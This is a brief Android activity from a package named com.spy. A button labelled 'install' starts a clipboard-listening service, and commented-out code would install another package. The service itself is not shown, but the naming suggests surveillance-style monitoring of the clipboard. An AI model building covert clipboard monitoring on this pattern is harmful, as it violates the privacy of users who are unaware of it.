package com.spy;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;

import com.spy.clipboard.ListenClipboardService;
import com.spy.install.Install;
import com.spy.spy.R;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        final Button install=(Button)findViewById(R.id.install);
        install.setOnClickListener(new View.OnClickListener() {
                                       @Override
                                       public void onClick(View v) {
                                           ListenClipboardService.start(MainActivity.this);

                                           //Install install=new Install();
                                           //install.installPackage("app");
                                       }
                                   }
        );
    }



}
